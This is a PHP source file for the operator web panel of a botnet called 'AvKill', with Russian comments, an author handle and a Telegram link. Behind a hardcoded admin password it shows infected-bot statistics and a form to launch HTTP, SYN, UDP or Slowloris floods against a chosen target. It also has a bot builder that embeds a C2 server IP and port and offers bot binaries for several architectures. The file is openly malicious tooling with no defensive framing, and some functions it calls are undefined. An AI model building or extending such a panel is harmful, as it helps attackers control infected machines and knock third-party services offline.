<?php
// web_panel/index.php
session_start();

$config = [
    'db_path' => '../c2_server/c2.db',
    'admin_user' => 'admin',
    'admin_pass' => 'avkill2024' // Сменить!
];

// Авторизация
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if($_POST['user'] == $config['admin_user'] && $_POST['pass'] == $config['admin_pass']) {
        $_SESSION['auth'] = true;
    }
}

if(!isset($_SESSION['auth'])) {
    showLogin();
    exit;
}

function showLogin() {
    echo '
    <!DOCTYPE html>
    <html>
    <head>
        <title>AvKill Botnet - Login</title>
        <style>
            body { background: #0a0a0a; color: #00ff00; font-family: monospace; }
            .login-box { width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #00ff00; }
            input { width: 100%; padding: 5px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; }
            button { background: #0f0; color: #000; padding: 10px; width: 100%; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>🔐 AvKill Botnet</h2>
            <form method="POST">
                <input type="text" name="user" placeholder="Username" required>
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>';
}

// Главная панель
function showDashboard() {
    $db = new SQLite3($GLOBALS['config']['db_path']);
    $bots = $db->query('SELECT COUNT(*) as total, SUM(is_active) as active FROM bots');
    $stats = $bots->fetchArray();
    
    echo '
    <!DOCTYPE html>
    <html>
    <head>
        <title>AvKill Botnet Control Panel</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { background: #0a0a0a; color: #00ff00; font-family: "Courier New", monospace; }
            .header { background: #111; padding: 20px; border-bottom: 2px solid #0f0; }
            .sidebar { width: 250px; float: left; background: #111; height: 100vh; padding: 20px; }
            .content { margin-left: 250px; padding: 20px; }
            .card { background: #111; border: 1px solid #0f0; padding: 20px; margin: 10px; border-radius: 5px; }
            .btn { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; margin: 5px; }
            .btn-red { background: #f00; color: #fff; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #0f0; padding: 10px; text-align: left; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🛡️ AvKill Botnet Control Panel</h1>
            <p>Author: @kwavka | Project: https://t.me/+x7wZtZ23I5pkMjQy</p>
        </div>
        
        <div class="sidebar">
            <h3>Navigation</h3>
            <ul style="list-style: none; margin-top: 20px;">
                <li><a href="?page=dashboard" style="color: #0f0; text-decoration: none; display: block; padding: 10px;">📊 Dashboard</a></li>
                <li><a href="?page=bots" style="color: #0f0; text-decoration: none; display: block; padding: 10px;">🤖 Bots</a></li>
                <li><a href="?page=ddos" style="color: #0f0; text-decoration: none; display: block; padding: 10px;">⚡ DDoS</a></li>
                <li><a href="?page=scan" style="color: #0f0; text-decoration: none; display: block; padding: 10px;">🔍 Scan</a></li>
                <li><a href="?page=builder" style="color: #0f0; text-decoration: none; display: block; padding: 10px;">🔨 Builder</a></li>
                <li><a href="?page=logout" style="color: #f00; text-decoration: none; display: block; padding: 10px;">🚪 Logout</a></li>
            </ul>
        </div>
        
        <div class="content">';
        
    $page = $_GET['page'] ?? 'dashboard';
    
    switch($page) {
        case 'dashboard':
            showDashboardContent($stats);
            break;
        case 'bots':
            showBotsList($db);
            break;
        case 'ddos':
            showDDoSForm();
            break;
        case 'scan':
            showScanForm();
            break;
        case 'builder':
            showBotBuilder();
            break;
        case 'logout':
            session_destroy();
            header('Location: index.php');
            break;
    }
    
    echo '</div></body></html>';
}

function showDashboardContent($stats) {
    echo '
    <div class="card">
        <h2>📊 Botnet Statistics</h2>
        <p>Total Bots: <strong>' . $stats['total'] . '</strong></p>
        <p>Active Bots: <strong>' . $stats['active'] . '</strong></p>
        <p>Infection Rate: <strong>' . ($stats['active']/$stats['total']*100) . '%</strong></p>
    </div>
    
    <div class="card">
        <h2>⚡ Quick Actions</h2>
        <button class="btn" onclick="startDDOS()">Start DDoS</button>
        <button class="btn" onclick="scanNetwork()">Scan Network</button>
        <button class="btn" onclick="updateBots()">Update All Bots</button>
    </div>';
}

function showDDoSForm() {
    echo '
    <div class="card">
        <h2>⚡ DDoS Attack</h2>
        <form method="POST" action="?action=ddos">
            <input type="text" name="target" placeholder="Target URL/IP" required style="width: 300px; padding: 10px; margin: 10px 0;">
            <br>
            <select name="method" style="width: 300px; padding: 10px; margin: 10px 0; background: #111; color: #0f0; border: 1px solid #0f0;">
                <option value="http">HTTP Flood</option>
                <option value="syn">SYN Flood</option>
                <option value="udp">UDP Flood</option>
                <option value="slowloris">Slowloris</option>
            </select>
            <br>
            <input type="number" name="duration" placeholder="Duration (seconds)" required style="width: 300px; padding: 10px; margin: 10px 0;">
            <br>
            <input type="number" name="threads" placeholder="Threads per bot" style="width: 300px; padding: 10px; margin: 10px 0;">
            <br>
            <button type="submit" class="btn btn-red" style="width: 300px;">🚀 Launch Attack</button>
        </form>
    </div>';
}

function showBotBuilder() {
    echo '
    <div class="card">
        <h2>🔨 Bot Builder</h2>
        <form method="POST" action="?action=build">
            <p>C2 Server IP: <input type="text" name="c2_ip" value="45.67.89.12" required></p>
            <p>C2 Port: <input type="number" name="c2_port" value="1337" required></p>
            <p>Architecture: 
                <select name="arch">
                    <option value="x86">x86</option>
                    <option value="x64">x64</option>
                    <option value="arm">ARM</option>
                    <option value="arm7">ARMv7</option>
                    <option value="mips">MIPS</option>
                </select>
            </p>
            <button type="submit" class="btn">Build Bot</button>
        </form>
        
        <hr style="border-color: #0f0; margin: 20px 0;">
        
        <h3>📥 Download Built Bots</h3>
        <p><a href="builds/bot_x86" style="color: #0f0;">🤖 x86 Bot</a></p>
        <p><a href="builds/bot_arm" style="color: #0f0;">🤖 ARM Bot</a></p>
        <p><a href="builds/bot_mips" style="color: #0f0;">🤖 MIPS Bot</a></p>
    </div>';
}

// Главный вызов
if(isset($_SESSION['auth'])) {
    showDashboard();
} else {
    showLogin();
}
?>